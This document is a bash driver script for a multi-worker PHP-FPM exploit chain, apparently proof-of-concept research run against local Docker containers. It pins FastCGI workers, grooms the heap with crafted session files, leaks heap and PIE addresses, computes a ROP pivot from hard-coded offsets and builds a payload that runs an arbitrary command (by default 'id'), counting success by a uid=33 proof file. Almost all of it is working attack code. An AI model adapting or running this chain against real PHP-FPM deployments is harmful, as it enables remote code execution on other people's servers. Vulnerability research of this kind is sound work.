#!/usr/bin/env bash
# Multi-worker FPM data-only ROP-pivot chain (no forged execute_data).
# Same pivot mechanism as run_rop_pivot.sh, against a pm.max_children=4 pool.
#
# Worker affinity: pin_fcgi.py pins PINS workers on incomplete FastCGI POST
# bodies, so only MAX_CHILDREN-PINS worker(s) accept new connections. With
# PINS=3 of 4, exactly one worker is free; the groom A (via nginx) and the
# leak/exploit B (direct FastCGI) then both land on it. Affinity is verified in
# the pool's access.log (zz-multi.conf logs the container-namespace worker PID
# via %p; A and B show the same PID).
#
# The chain is single-shot per worker: the groom/reclaim alignment only holds
# on a worker's first groom (heap churn breaks later grooms), and a successful
# exploit SIGSEGVs the worker. A respawned worker is not leak-fresh. So, exactly
# as run_rop_pivot.sh recreates its container per invocation, this recreates the
# pool per run and drives one chain against the fresh free worker.
#
# Isolated: own alias p2s-fpm-pivot4, nginx p2s-nginx-pivot4, net p2s-pivot-net.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
NAME=${NATIVE_NAME:-p2s-fpm-pivot4}
NET=${NET:-p2s-pivot-net}
NGINX=${NGINX:-p2s-nginx-pivot4}
NGINX_PORT=${NGINX_PORT:-9112}
FCGI_PORT=${FCGI_PORT:-9111}
IMAGE=${IMAGE:-php:8.5.11-fpm}
INI=${INI:-/usr/local/etc/php/php.ini-production}
POOL_CONF=${POOL_CONF:-zz-multi.conf}
NGINX_CONF=${NGINX_CONF:-nginx-pivot4.conf}
MAX_CHILDREN=${MAX_CHILDREN:-4}
PINS=${PINS:-3}
RUNS=${RUNS:-5}
PRE=${PRE:-24576}
PIN_SETTLE=${PIN_SETTLE:-3}
LEAK_TRIES=${LEAK_TRIES:-4}
CMD=${CMD:-id > /tmp/fpm_rop_proof}
PROOF_CONTAINER=/tmp/fpm_rop_proof

A=11111111111111111111111111111111
LB=22222222222222222222222222222222
EB=33333333333333333333333333333333

docker network inspect "$NET" >/dev/null 2>&1 || docker network create "$NET" >/dev/null

make_pool() {
    docker rm -f "$NAME" "$NGINX" >/dev/null 2>&1 || true
    docker run -d --name "$NAME" --network "$NET" --network-alias "$NAME" \
        -p 127.0.0.1:"$FCGI_PORT":9000 \
        -v "$ROOT/www:/var/www/html:ro" \
        -v "$HERE/$POOL_CONF:/usr/local/etc/php-fpm.d/$POOL_CONF:ro" \
        "$IMAGE" php-fpm -F -c "$INI" >/dev/null
    sleep 1.7
    docker run -d --name "$NGINX" --network "$NET" \
        -p 127.0.0.1:"$NGINX_PORT":80 \
        -v "$HERE/$NGINX_CONF:/etc/nginx/conf.d/default.conf:ro" \
        nginx:alpine >/dev/null
    sleep 0.8
    printf 'a|i:12345;b|i:12345678901234;c|i:12345678901234;d|i:12345678901234;e|i:123456789012345;' > /tmp/pivot4_small
    docker cp /tmp/pivot4_small "$NAME:/tmp/sess_$LB" >/dev/null
    docker exec "$NAME" chown 33:33 "/tmp/sess_$LB"
    docker exec "$NAME" rm -f "$PROOF_CONTAINER" >/dev/null 2>&1 || true
}

# Pin PINS workers without issuing a /status request: a single /status served by
# the free worker perturbs its heap enough to break the first-groom reclaim.
start_pins() {
    [ "$PINS" -gt 0 ] || { PINPID=""; return; }
    MAX_CHILDREN="$MAX_CHILDREN" STATUS_CHECK=0 setsid python3 "$HERE/pin_fcgi.py" \
        "$FCGI_PORT" "$PINS" >/tmp/p2s_pins4.log 2>&1 </dev/null &
    PINPID=$!
    sleep "$PIN_SETTLE"
}

stop_pins() {
    [ -n "${PINPID:-}" ] || return
    kill "$PINPID" >/dev/null 2>&1 || true
    PINPID=""
}

do_leak() {
    HEAP=""; PIE=""
    local t
    for t in $(seq 1 "$LEAK_TRIES"); do
        HEAP=""; PIE=""
        docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
        docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
        curl --max-time 30 -s -o /dev/null -b "PHPSESSID=$A" \
            "http://127.0.0.1:$NGINX_PORT/fpm_sess_split2.php?pre=$PRE&pad=1490900&hole=4096" || true
        python3 "$HERE/fcgi_split.py" "$FCGI_PORT" "$LB" feffffffffffffff 0 0 0 4088 12 \
            /var/www/html/echo.php /tmp/pivot4_leak.bin >/dev/null 2>&1 || true
        read -r HEAP PIE < <(python3 - <<'PY'
import struct, sys
try:
    d = open('/tmp/pivot4_leak.bin', 'rb').read()
except OSError:
    sys.exit(1)
raw = None
for ln in d.split(b'\n'):
    if ln.startswith(b'v5:'):
        try:
            raw = bytes.fromhex(ln[3:].decode())
        except Exception:
            sys.exit(1)
        break
if raw is None or len(raw) < 0x3010:
    sys.exit(1)
heap = None
for off in range(0, len(raw) - 8, 8):
    q = struct.unpack_from('<Q', raw, off)[0]
    if 0x100000000000 < q < 0x800000000000 and (q & 0xfff) == 0x428:
        heap = q
        break
pie = struct.unpack_from('<Q', raw, 0x3008)[0]
if heap is None or pie <= 0x100000000000 or (pie & 0xfff) != 0x777:
    sys.exit(1)
print('%#x %#x' % (heap, pie))
PY
) || true
        [ -n "${HEAP:-}" ] && [ -n "${PIE:-}" ] && { LEAK_TRY=$t; return 0; }
        sleep 0.3
    done
    return 1
}

OK=0
for run in $(seq 1 "$RUNS"); do
    make_pool
    start_pins
    if ! do_leak; then
        echo "[run $run] leak FAILED"
        stop_pins
        continue
    fi
    DRIFT=${DRIFT:-0x37000}
    D=$((HEAP + 0x15cbd8 + DRIFT))
    BASE=$((PIE - 0x7c9777))
    PIVOT=$((BASE + 0x6bdd0e))
    printf 'p1|i:1;p2|i:1;p3|i:1;p4|i:%d;p5|i:%d;p6|i:%d;p7|i:16;p8|i:%d;' \
        $((D + 0x38)) $((D + 0xA00)) $((D + 0xE80)) "$PIVOT" > /tmp/pivot4_sess_T
    python3 "$HERE/mk_native_fill.py" --d "$D" --heap "$HEAP" \
        --infile "$HERE/payload/fillU.bin" --out /tmp/pivot4_base.bin --nogdb >/dev/null
    python3 "$HERE/mk_rop_pivot.py" --d "$D" --base "$BASE" \
        --base-fill /tmp/pivot4_base.bin --out /tmp/pivot4_fill.bin --cmd "$CMD" >/dev/null
    docker cp /tmp/pivot4_sess_T "$NAME:/tmp/sess_$EB" >/dev/null
    docker exec "$NAME" chown 33:33 "/tmp/sess_$EB"
    docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
    docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
    curl --max-time 30 -s -o /dev/null -b "PHPSESSID=$A" \
        "http://127.0.0.1:$NGINX_PORT/fpm_sess_split2.php?pre=$PRE&pad=1490900&hole=4096" || true
    python3 "$HERE/fcgi_split.py" "$FCGI_PORT" "$EB" feffffffffffffff ${XPAD:-0} 0 1 0 0 \
        /var/www/html/index.php /tmp/pivot4_b.out 12000 150 8170 /tmp/pivot4_fill.bin \
        >/dev/null 2>&1 || true
    sleep 0.5
    if docker cp "$NAME:$PROOF_CONTAINER" /tmp/pivot4_proof.out >/dev/null 2>&1 \
        && grep -q 'uid=33' /tmp/pivot4_proof.out; then
        OK=$((OK + 1))
        echo "[run $run] OK (leak try $LEAK_TRY) d=$(printf %#x $D) base=$(printf %#x $BASE) -> $(cat /tmp/pivot4_proof.out)"
    else
        echo "[run $run] MISS (leak try ${LEAK_TRY:-?}) d=$(printf %#x $D) base=$(printf %#x $BASE)"
    fi
    stop_pins
done

echo "[result] $OK/$RUNS proof hits (PINS=$PINS/$MAX_CHILDREN workers, PRE=$PRE, fresh pool per run)"
